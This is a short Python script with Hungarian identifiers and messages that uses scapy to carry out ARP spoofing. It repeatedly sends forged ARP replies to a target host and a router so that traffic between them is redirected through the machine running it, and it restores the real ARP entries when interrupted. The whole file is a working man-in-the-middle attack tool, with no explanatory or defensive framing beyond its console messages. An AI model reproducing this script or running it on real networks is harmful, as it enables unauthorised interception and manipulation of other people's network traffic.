import scapy.all as scapy
import os
import sys
import time

def spoof(celpont_ip, spoofolt_ip):
    celpont_mac = mac_cim_beolvasas(celpont_ip)
    packet = scapy.ARP(op=2, pdst=celpont_ip, hwdst=celpont_mac, psrc=spoofolt_ip)
    scapy.send(packet, verbose=False)

def mac_cim_beolvasas(ip):
    arp_keres = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    egyesitett_keres = broadcast/arp_keres
    valaszolt = scapy.srp(egyesitett_keres, timeout=1, verbose=False)[0]

    return valaszolt[0][1].hwsrc

def visszaallit(forras_ip, cel_ip):
    cel_mac = mac_cim_beolvasas(cel_ip)
    forras_mac = mac_cim_beolvasas(forras_ip)
    packet = scapy.ARP(op=2, pdst=cel_ip, hwdst=cel_mac, psrc=forras_ip, hwsrc=forras_mac)
    scapy.send(packet, verbose=False)

elkuldott_packetek = 0
celpont = ''
router = ''

try:
    while True:
        spoof(celpont, router)
        spoof(router, celpont)
        elkuldott_packetek += 2
        print('\r[+] Elküldött packetek száma:', elkuldott_packetek, end='')
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    print('[+] CTRL + C -t érzékeltünk, a program befejezi a futását...')
    visszaallit(router, celpont)
    visszaallit(celpont, router)